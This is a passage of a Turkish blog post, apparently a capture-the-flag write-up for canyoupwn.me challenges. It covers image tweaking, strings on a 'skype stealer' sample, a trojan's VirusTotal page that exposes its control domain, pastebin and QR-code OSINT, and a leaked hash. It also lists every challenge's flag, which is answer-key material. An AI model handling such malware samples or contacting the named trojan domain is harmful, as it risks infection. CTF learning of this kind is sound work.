-İlk sorumuz : There is not exist easier than this&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-9sX4L9z_90g/WSocWS5Vz9I/AAAAAAAAAao/tgV_22kqZ28Wy3wajw8mBjWwxj621gqQwCLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;444&quot; data-original-width=&quot;599&quot; height=&quot;237&quot; src=&quot;https://1.bp.blogspot.com/-9sX4L9z_90g/WSocWS5Vz9I/AAAAAAAAAao/tgV_22kqZ28Wy3wajw8mBjWwxj621gqQwCLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bize bir google drive linki vermiş ekibimiz ben başta bir çok şekil şukul denesemde sonunda kendimi paintte resim dosyası ile parlaklık ayarlarını yaparken buldum parlaklığı en az’a çekip kontrastları yüksek yapınca flag gözüküyordu.&lt;br /&gt;
-&lt;br /&gt;
-1.sorumuz’un cevabı : cypwn_{cok_gizli}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-j3LSJv-VvBI/WSodLiBcTQI/AAAAAAAAAaw/O7I3g3gx5m8OXG5IK8Xfh4B1ygoUr3dNwCLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;503&quot; data-original-width=&quot;599&quot; height=&quot;268&quot; src=&quot;https://1.bp.blogspot.com/-j3LSJv-VvBI/WSodLiBcTQI/AAAAAAAAAaw/O7I3g3gx5m8OXG5IK8Xfh4B1ygoUr3dNwCLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-2.sorumuza geçelim : Ava Giden Avlanır&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-ZZLxbDaL8m0/WSodkbjILSI/AAAAAAAAAa0/lnPibSfi2zsnYsS9NQrAAK28s_6GRu5rACLcB/s1600/Screenshot_5.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;444&quot; data-original-width=&quot;599&quot; height=&quot;237&quot; src=&quot;https://2.bp.blogspot.com/-ZZLxbDaL8m0/WSodkbjILSI/AAAAAAAAAa0/lnPibSfi2zsnYsS9NQrAAK28s_6GRu5rACLcB/s320/Screenshot_5.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Sorumuz bize bir analiz.rar dosyası veriyor.&lt;br /&gt;
-&lt;br /&gt;
-unrar aracılığıyla dosyanın içini açtığımızda karşımıza “skype stelaeri” diye bir dosya çıkıyor bu dosyayı strings ile incelediğimde ise bir kaç flage benzeyen yazı buldum tek tek hepsini deneyince.&lt;br /&gt;
-&lt;br /&gt;
-2.sorumuz’un cevabını : cypwn_{capkin_hacker} olarak buluyoruz&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-cSMc9Z02rfc/WSofM0cu7tI/AAAAAAAAAbA/EWQP5Njyht4PqS34Q0Sm-whI3de-OdeoQCLcB/s1600/Screenshot_6.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;245&quot; data-original-width=&quot;690&quot; height=&quot;113&quot; src=&quot;https://1.bp.blogspot.com/-cSMc9Z02rfc/WSofM0cu7tI/AAAAAAAAAbA/EWQP5Njyht4PqS34Q0Sm-whI3de-OdeoQCLcB/s320/Screenshot_6.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-12sReZVdaJQ/WSofZdgLh7I/AAAAAAAAAbE/EYWqRomnGoAJpT7vrUy_clZzb05HfYx7gCLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;134&quot; data-original-width=&quot;276&quot; src=&quot;https://2.bp.blogspot.com/-12sReZVdaJQ/WSofZdgLh7I/AAAAAAAAAbE/EYWqRomnGoAJpT7vrUy_clZzb05HfYx7gCLcB/s1600/Screenshot_7.png&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-ycNjIoRPz7Q/WSofmtI1wFI/AAAAAAAAAbI/2kok-UDMQzsSp0lOv7H4AhL0KVhlPyPpgCLcB/s1600/Screenshot_8.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;509&quot; data-original-width=&quot;600&quot; height=&quot;270&quot; src=&quot;https://3.bp.blogspot.com/-ycNjIoRPz7Q/WSofmtI1wFI/AAAAAAAAAbI/2kok-UDMQzsSp0lOv7H4AhL0KVhlPyPpgCLcB/s320/Screenshot_8.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-3.sorumuza geçelim : Bir türüjan yazmışım moruk&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-UmKwA0d58nU/WSof9t1MctI/AAAAAAAAAbM/uNUQtDKOZu4wv5n0vDhe8fjpqjiUQ275ACLcB/s1600/Screenshot_9.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;444&quot; data-original-width=&quot;598&quot; height=&quot;237&quot; src=&quot;https://4.bp.blogspot.com/-UmKwA0d58nU/WSof9t1MctI/AAAAAAAAAbM/uNUQtDKOZu4wv5n0vDhe8fjpqjiUQ275ACLcB/s320/Screenshot_9.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu sorumuzda ekibimiz bize bir “server.rar” dosyası veriyor indirmeye çalıştığımızda ise “chrome” arkadaşımız bize bas bas zararlı bu dosya diye bağırıyor zaten sorumuzun adındanda anlamıştık ne olduğunu :D&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-IljibLd270M/WSohPcu7prI/AAAAAAAAAbY/O940gy5oxaUX13xkUBcs7pcd7uCnZODtACLcB/s1600/Screenshot_10.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;50&quot; data-original-width=&quot;305&quot; src=&quot;https://1.bp.blogspot.com/-IljibLd270M/WSohPcu7prI/AAAAAAAAAbY/O940gy5oxaUX13xkUBcs7pcd7uCnZODtACLcB/s1600/Screenshot_10.png&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu dosyaya online “sandbox” yolu göründü baştan.İndirip “unrar” ile açtığımızda karşımıza “server.exe” isimli bir dosya geliyor.Bu dosyası “file” komutu ile incelediğimize “PE32 executable” dosya olduğunu söylüyor.Bunu hemen vazgeçilmezimiz “virustotal.com”a atıyoruz ve inceliyoruz.İncelerken bu dosyanın daha önceden tarandığını ve bakabileceğimizi söylüyor.&lt;br /&gt;
-&lt;br /&gt;
-Daha önceden taranan  “server.exe” dosyamızın ne olduğuna bakmaya çalışırken yorumlarada kaydı gözüm ve flagimiz oradaydı.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-mS0YLHNAhEM/WSoi32u_h-I/AAAAAAAAAbk/nVghukKo-2kBpd5pcNT2Lg--BXF3HzR4gCLcB/s1600/Screenshot_12.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;180&quot; data-original-width=&quot;961&quot; height=&quot;59&quot; src=&quot;https://2.bp.blogspot.com/-mS0YLHNAhEM/WSoi32u_h-I/AAAAAAAAAbk/nVghukKo-2kBpd5pcNT2Lg--BXF3HzR4gCLcB/s320/Screenshot_12.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-3.Sorumuz’un cevabı : cypwn_{capkinhacker.zapto.org}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-u14xV0JdHOs/WSojPkMsEvI/AAAAAAAAAbs/cuyJSU5FmGYL5lKezTp6ijtxkamjWAlBQCLcB/s1600/Screenshot_13.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;504&quot; data-original-width=&quot;599&quot; height=&quot;269&quot; src=&quot;https://3.bp.blogspot.com/-u14xV0JdHOs/WSojPkMsEvI/AAAAAAAAAbs/cuyJSU5FmGYL5lKezTp6ijtxkamjWAlBQCLcB/s320/Screenshot_13.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-4.Sorumuza geçelim : TV?&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-XaXooruyvT8/WSojiZYtg4I/AAAAAAAAAbw/Cfh9kclV_nExc8NmiB_cd1XJ88CtSdF0QCLcB/s1600/Screenshot_14.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;520&quot; data-original-width=&quot;599&quot; height=&quot;277&quot; src=&quot;https://4.bp.blogspot.com/-XaXooruyvT8/WSojiZYtg4I/AAAAAAAAAbw/Cfh9kclV_nExc8NmiB_cd1XJ88CtSdF0QCLcB/s320/Screenshot_14.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruda baya kafa yordum ben.Sebebini az sonra öğrenicez zaten :D&lt;br /&gt;
-&lt;br /&gt;
-Öncelikle sorumuz : Hacı geçen canyoupwnme diye bir kanal gördüm onion pi den bahsediyordu, “bin”li bişeler vardı sanki..&lt;br /&gt;
-&lt;br /&gt;
-Sorudan dolayı ben hemen “canyoupwn.me” sitesine gittim ve arama bölümüne onion yazdım.Soruda “onion pi ile ilgili bahsediyordu” diyince ilk aklıma sitelerinde aramak geldi.&lt;br /&gt;
-&lt;br /&gt;
-Yazıyı baya inceledik’ten sonra sayfanın en altında değişik bir yazı gördüm ilk önce bunun “hash” olabileceğini düşündüm ama değildi.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-IJpgts2Xln0/WSokyW78SCI/AAAAAAAAAb8/h2exHmJCu4IMWtad95nvwmXRzPDY3rNUQCLcB/s1600/Screenshot_15.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;320&quot; data-original-width=&quot;845&quot; height=&quot;121&quot; src=&quot;https://2.bp.blogspot.com/-IJpgts2Xln0/WSokyW78SCI/AAAAAAAAAb8/h2exHmJCu4IMWtad95nvwmXRzPDY3rNUQCLcB/s320/Screenshot_15.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Pastebin ile arkadaş grubumuzda birşeyler paylaşırken pastebin urlsinin son yazıları çok tanıdık geldi.&lt;br /&gt;
-&lt;br /&gt;
-TV? sorusunu tam bırakacakken bu pastebin urlsi yüzünden geri döndüm “onion pi kurulum” yazısına ve o yazıyı pastebinin yanina&lt;br /&gt;
-&lt;br /&gt;
-pastebin.com/xvtMaBkU&lt;br /&gt;
-&lt;br /&gt;
-olarak yerleştirdim ve flag karşımdaydı.Yazıda çok kolaymış gibi görünüyor ama belkide o pastebini o grupta paylaşmasam bu soruyu çözemeyip yerlerde sürünecektim :D şans işte.&lt;br /&gt;
-&lt;br /&gt;
-4.Sorumuz’un cevabı : cypwn_{h4ckm3}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-jlNEFaok90g/WSolfY5jOcI/AAAAAAAAAcE/jMriJq5hheAbMpYSn7rWwJHOGaraszlyQCLcB/s1600/Screenshot_16.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;578&quot; data-original-width=&quot;600&quot; height=&quot;308&quot; src=&quot;https://3.bp.blogspot.com/-jlNEFaok90g/WSolfY5jOcI/AAAAAAAAAcE/jMriJq5hheAbMpYSn7rWwJHOGaraszlyQCLcB/s320/Screenshot_16.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-5.Sorumuz’a geçelim : This is Anonymous job!&lt;br /&gt;
-&lt;br /&gt;
-Bu soruda merak sınırlarımı iyicebi zorladım hiç bitmeyen merakımı.&lt;br /&gt;
-&lt;br /&gt;
-5,6 kişi hariç bu soruyu çözen hiç kimse yok leaderboard’ta.&lt;br /&gt;
-&lt;br /&gt;
-İpucu : Selwyn Jamison`ın şirketi saldırıya uğramış parolalar leak olmuş..&lt;br /&gt;
-&lt;br /&gt;
-Baya bir uğraştım bu soru için sonunda Sorunun başlığını görünce google’de şöyle bir araştırma sergiledim.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-Px3IUq1Yl5k/WSonqoh0Z5I/AAAAAAAAAcY/RlxwKfQIV4M2rC28KuWTyexRAudRW85wwCLcB/s1600/Screenshot_18.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;663&quot; data-original-width=&quot;1350&quot; height=&quot;156&quot; src=&quot;https://4.bp.blogspot.com/-Px3IUq1Yl5k/WSonqoh0Z5I/AAAAAAAAAcY/RlxwKfQIV4M2rC28KuWTyexRAudRW85wwCLcB/s320/Screenshot_18.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruda cidden terledim 1 saat ne yemek yedim ne birşey birde şişman adamım ben kalamıyorum öyle :D. Tam bayılıcam derken oradaki hashlere rastladım ve hash-identifier’e attım ama hiçbirşey çıkaramadım.Sonunda aceba hash’lardan birimi lan cevap dayanç ? diye sordum kendime ve yolumu ilk işaretlediğim hash ile buldum :D.&lt;br /&gt;
-&lt;br /&gt;
-5.Sorumuz’un cevabı : cypwn_{2dad125c0c244a8cad69951515ecdeb75b0b1daa}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-urNN5b8ebEU/WSooKWiW0dI/AAAAAAAAAcg/cz3SZIrprfseI8hNUOsjW54XVjdE2hfIgCLcB/s1600/Screenshot_19.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;578&quot; data-original-width=&quot;599&quot; height=&quot;308&quot; src=&quot;https://4.bp.blogspot.com/-urNN5b8ebEU/WSooKWiW0dI/AAAAAAAAAcg/cz3SZIrprfseI8hNUOsjW54XVjdE2hfIgCLcB/s320/Screenshot_19.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-6.Sorumuz’a geçelim : Social Media&lt;br /&gt;
-&lt;br /&gt;
-Bu soruda gerçek bir stalker olduğum kanısına vardım :D&lt;br /&gt;
-&lt;br /&gt;
-İlk aracımız tabiki google oldu ismi googlede araştırdığımızda ilk 3 linkte garip geliyor.Hepsini ben tek tek inceledim.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-6Od8ejlxOK4/WSoqAQCeMCI/AAAAAAAAAcs/BxrqNs3sW2sQQcj50Skh4_22UZ7gHrEZQCLcB/s1600/Screenshot_20.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;662&quot; data-original-width=&quot;1353&quot; height=&quot;156&quot; src=&quot;https://4.bp.blogspot.com/-6Od8ejlxOK4/WSoqAQCeMCI/AAAAAAAAAcs/BxrqNs3sW2sQQcj50Skh4_22UZ7gHrEZQCLcB/s320/Screenshot_20.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-2.ve 3. linkte bir “QR CODE” vardı.Yeni sekmede resim’i açıp online bir “QR CODE DECODER” ile flagimizi bulmuş olduk.&lt;br /&gt;
-&lt;br /&gt;
-Adımları ve hangi online decoder sitesini kullandığımı tek tek fotoraflar’dan görebilirsiniz.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-Skkt05hkQyk/WSoqxVo7lII/AAAAAAAAAc8/h1Z0qRa359wApQ0W1iCevXGMCVtjppzJQCLcB/s1600/Screenshot_21.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;615&quot; data-original-width=&quot;1238&quot; height=&quot;158&quot; src=&quot;https://3.bp.blogspot.com/-Skkt05hkQyk/WSoqxVo7lII/AAAAAAAAAc8/h1Z0qRa359wApQ0W1iCevXGMCVtjppzJQCLcB/s320/Screenshot_21.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-5oJhVGUY8sE/WSoqxMnCAhI/AAAAAAAAAc0/igTB9blWrvQzWzWa9UkPYpAqS1tbQzJQwCLcB/s1600/Screenshot_22.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;628&quot; data-original-width=&quot;940&quot; height=&quot;213&quot; src=&quot;https://4.bp.blogspot.com/-5oJhVGUY8sE/WSoqxMnCAhI/AAAAAAAAAc0/igTB9blWrvQzWzWa9UkPYpAqS1tbQzJQwCLcB/s320/Screenshot_22.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-I6ysKi5Wo7Q/WSoqxQheLfI/AAAAAAAAAc4/nLuO2xM4qqkSVj2bzd1dNJ61mK4oex6bACLcB/s1600/Screenshot_23.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;610&quot; data-original-width=&quot;1220&quot; height=&quot;160&quot; src=&quot;https://2.bp.blogspot.com/-I6ysKi5Wo7Q/WSoqxQheLfI/AAAAAAAAAc4/nLuO2xM4qqkSVj2bzd1dNJ61mK4oex6bACLcB/s320/Screenshot_23.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-1KANq19DjXo/WSoqxiuWEoI/AAAAAAAAAdA/IF_greZJv203scVtqfuXdRrfjWNgjv2rwCLcB/s1600/Screenshot_24.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;397&quot; data-original-width=&quot;1212&quot; height=&quot;104&quot; src=&quot;https://1.bp.blogspot.com/-1KANq19DjXo/WSoqxiuWEoI/AAAAAAAAAdA/IF_greZJv203scVtqfuXdRrfjWNgjv2rwCLcB/s320/Screenshot_24.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-6.Sorumuz’un cevabı : cypwn_{Are_you_a_hacker_?}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-OAry--z4k1g/WSorKUOY5ZI/AAAAAAAAAdE/Bhd-ryrt74QXx8LzRp-R-zPL6Pupxt-SQCLcB/s1600/Screenshot_25.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;578&quot; data-original-width=&quot;598&quot; height=&quot;309&quot; src=&quot;https://2.bp.blogspot.com/-OAry--z4k1g/WSorKUOY5ZI/AAAAAAAAAdE/Bhd-ryrt74QXx8LzRp-R-zPL6Pupxt-SQCLcB/s320/Screenshot_25.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-7.Sorumuz’a geçelim : Nerd&lt;br /&gt;
-&lt;br /&gt;
-İpucu’muz : I need a source code for a domain. But I don’t know what is the domain name! search “ canyoupwn.me “&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-djE_yVkECDw/WSor33eP2zI/AAAAAAAAAdM/wqMZi_GzgMAvIX7fHaZX2t86yj3o9hCFwCLcB/s1600/Screenshot_27.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;473&quot; data-original-width=&quot;598&quot; height=&quot;253&quot; src=&quot;https://3.bp.blogspot.com/-djE_yVkECDw/WSor33eP2zI/AAAAAAAAAdM/wqMZi_GzgMAvIX7fHaZX2t86yj3o9hCFwCLcB/s320/Screenshot_27.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruya anlam veremedim ben ve yine google’ye sarıldım.&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz’da “canyoupwn.me” domainimiz için kaynak kodu aramamız gerekiyor.İpucumuzdaki keywordleri birleştirerek bir google araştırması sergiledim ve 1. URL’mizin açıklamasında source code arayabileceğimiz yazıyordu.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-sjQmrTMEgbA/WSosU41L5TI/AAAAAAAAAdQ/R2ylTl_npjkDuifiQt5LArkWJwK23SqpwCLcB/s1600/Screenshot_26.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;654&quot; data-original-width=&quot;1365&quot; height=&quot;153&quot; src=&quot;https://2.bp.blogspot.com/-sjQmrTMEgbA/WSosU41L5TI/AAAAAAAAAdQ/R2ylTl_npjkDuifiQt5LArkWJwK23SqpwCLcB/s320/Screenshot_26.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Siteye girdiğimizde bizi böyle bir ekran karşıladı.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-irqY0FZkvaQ/WSoshfSwx8I/AAAAAAAAAdU/qISGeBjMBZsuixxWpezJrnMnYyEuMlqpwCLcB/s1600/Screenshot_28.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;690&quot; data-original-width=&quot;1241&quot; height=&quot;177&quot; src=&quot;https://2.bp.blogspot.com/-irqY0FZkvaQ/WSoshfSwx8I/AAAAAAAAAdU/qISGeBjMBZsuixxWpezJrnMnYyEuMlqpwCLcB/s320/Screenshot_28.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Hemen arama bölümüne “canyoupwn.me” yazdım ve bu seferde farklı bir domain çıktı başlık olarak.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-uZVDHIEOMNg/WSosxrrXxeI/AAAAAAAAAdY/876UYoYzZ-8wdRkk0rn8Lq2Zz-N3iVDyACLcB/s1600/Screenshot_29.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;656&quot; data-original-width=&quot;1351&quot; height=&quot;155&quot; src=&quot;https://4.bp.blogspot.com/-uZVDHIEOMNg/WSosxrrXxeI/AAAAAAAAAdY/876UYoYzZ-8wdRkk0rn8Lq2Zz-N3iVDyACLcB/s320/Screenshot_29.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Aceba flag’imiz bu domain olabilirmi diye bir deneme yaptıııııık yapış o yapış.&lt;br /&gt;
-&lt;br /&gt;
-7.Sorumuz’un cevabı : cypwn_{erdemoflaz.com}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-0ilv8N1A7JI/WSotFG_krtI/AAAAAAAAAdc/zf6nt68D5hs9l6gh48vdbQfG6ihXKXyKQCLcB/s1600/Screenshot_30.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;530&quot; data-original-width=&quot;599&quot; height=&quot;283&quot; src=&quot;https://4.bp.blogspot.com/-0ilv8N1A7JI/WSotFG_krtI/AAAAAAAAAdc/zf6nt68D5hs9l6gh48vdbQfG6ihXKXyKQCLcB/s320/Screenshot_30.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-8.Sorumuz’a geçelim : Secret&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : secret.canyoupwn.me&lt;br /&gt;
-&lt;br /&gt;
-İpucunda verilen web siteye girdiğimizde hiçbir türlü cevap gelmiyor server’den.Dns adresi bulunamadı diyor.Bizde hemen bir “DNS KAYIT” lookup’u yapıyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
